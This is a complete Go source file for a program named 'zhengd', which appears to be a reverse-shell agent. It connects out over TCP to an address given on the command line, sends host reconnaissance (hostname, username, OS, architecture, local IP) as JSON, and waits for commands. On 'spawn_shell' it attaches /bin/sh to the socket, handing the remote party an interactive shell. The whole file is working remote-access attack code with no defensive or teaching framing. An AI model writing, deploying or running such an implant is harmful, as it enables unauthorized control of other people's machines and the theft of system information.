package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Kernel   string `json:"kernel"`
	IP       string `json:"ip"`
}

func gatherRecon() Recon {
	hostname, _ := os.Hostname()

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("LOGNAME")
	}

	ip := getLocalIP()

	return Recon{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Kernel:   runtime.GOOS,
		IP:       ip,
	}
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func main() {
	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
	flag.Parse()

	if *connectAddr == "" {
		fmt.Fprintf(os.Stderr, "usage: zhengd -connect <ip:port>\n")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", *connectAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "connected to %s\n", *connectAddr)

	// Send recon info
	recon := gatherRecon()
	reconJSON, _ := json.Marshal(recon)
	fmt.Fprintf(conn, "%s\n", reconJSON)

	// Wait for commands
	decoder := json.NewDecoder(conn)
	for {
		var msg struct {
			Cmd string `json:"cmd"`
		}
		if err := decoder.Decode(&msg); err != nil {
			fmt.Fprintf(os.Stderr, "connection lost: %v\n", err)
			break
		}

		switch strings.TrimSpace(msg.Cmd) {
		case "spawn_shell":
			fmt.Fprintf(os.Stderr, "spawning shell...\n")
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn

			// Send ready signal
			readyJSON, _ := json.Marshal(map[string]string{"status": "shell_ready"})
			fmt.Fprintf(conn, "%s\n", readyJSON)

			if err := cmd.Run(); err != nil {
				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
			}

			// Shell ended, send notification
			doneJSON, _ := json.Marshal(map[string]string{"status": "shell_done"})
			fmt.Fprintf(conn, "%s\n", doneJSON)

		case "exit":
			fmt.Fprintf(os.Stderr, "exiting...\n")
			return

		default:
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", msg.Cmd)
		}
	}
}
